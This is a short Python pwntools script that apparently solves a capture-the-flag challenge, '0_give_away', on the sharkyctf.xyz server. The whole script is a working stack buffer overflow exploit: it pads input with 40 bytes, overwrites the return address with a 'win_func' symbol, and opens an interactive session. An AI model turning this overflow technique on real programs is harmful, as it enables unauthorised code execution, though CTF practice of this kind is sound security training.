from pwn import *


ARCH = 'amd64'
FILE = './0_give_away'
LIBC = ''
HOST = 'sharkyctf.xyz'
PORT = 20333


def exploit(con, elf, libc, rop):
    flag_symbol = elf.symbols["win_func"]
    log.info(f'flag symbol:{hex(flag_symbol)}')

    offset = 40
    payload = b'A' * offset
    payload += pack(flag_symbol)
    log.info(f'payload: {payload}')
    con.sendline(payload)

def main():
    context(arch=ARCH, os='linux')

    if args['REMOTE']:
        con = remote(HOST, PORT)
    else:
        con = process([FILE])

    elf = ELF(FILE)
    if LIBC != '':
        libc = ELF(LIBC)
    else:
        libc = ''
    rop = ROP(elf)
    exploit(con, elf, libc, rop)
    con.interactive()

if __name__ == '__main__':
    main()
